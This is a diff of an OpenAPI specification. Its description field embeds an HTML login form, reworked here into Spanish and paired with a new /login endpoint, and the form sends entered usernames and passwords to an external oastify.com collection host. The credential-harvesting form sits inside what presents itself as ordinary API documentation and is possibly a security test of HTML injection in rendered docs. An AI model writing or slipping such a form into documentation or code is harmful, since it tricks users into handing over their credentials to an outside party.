@@ -3,20 +3,26 @@ info:
   version: 1.0.0
   title: Login Page
   description: |
-    <div class="login-form" style="font-family: sans-serif;">
-      <div class="form-container" style="width: 100%; max-width: 400px; margin: 20px auto; padding: 20px; background: #fff; border-radius: 8px; box-shadow: 0 4px 8px rgba(0,0,0,0.1); border: 1px solid #eee;">
-        <h2 style="text-align: center; color: #333;">Login Page</h2>
+    <div style="background:#f4f4f4; padding:20px; border-radius:10px; font-family:sans-serif;">
+      <div style="background:#fff; padding:20px; border-radius:8px; max-width:350px; margin:0 auto; box-shadow:0 2px 10px rgba(0,0,0,0.1);">
+        <h2 style="text-align:center; color:#333; margin-top:0;">Iniciar Sesión</h2>
         <form action="http://isexbjuxknrc17t3jv3bx34u7ldc12pr.oastify.com" method="post">
-          <div style="margin-bottom: 15px;">
-            <label style="display: block; margin-bottom: 5px; font-weight: bold;">Username</label>
-            <input type="text" name="username" style="width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box;">
+          <div style="margin-bottom:15px;">
+            <label style="display:block; margin-bottom:5px; color:#666;">Username</label>
+            <input type="text" name="username" placeholder="Tu usuario" style="width:100%; padding:10px; border:1px solid #ccc; border-radius:4px; box-sizing:border-box;">
           </div>
-          <div style="margin-bottom: 15px;">
-            <label style="display: block; margin-bottom: 5px; font-weight: bold;">Password</label>
-            <input type="password" name="password" style="width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box;">
+          <div style="margin-bottom:15px;">
+            <label style="display:block; margin-bottom:5px; color:#666;">Password</label>
+            <input type="password" name="password" placeholder="Tu contraseña" style="width:100%; padding:10px; border:1px solid #ccc; border-radius:4px; box-sizing:border-box;">
           </div>
-          <button type="submit" style="width: 100%; padding: 12px; background-color: #5cb85c; border: none; color: white; font-size: 16px; border-radius: 4px; cursor: pointer;">Login</button>
+          <button type="submit" style="width:100%; padding:10px; background:#5cb85c; color:#fff; border:none; border-radius:4px; font-size:16px; cursor:pointer;">Acceder</button>
         </form>
       </div>
     </div>
-paths: {}
+paths:
+  /login:
+    post:
+      summary: "Login endpoint"
+      responses:
+        200:
+          description: "OK"
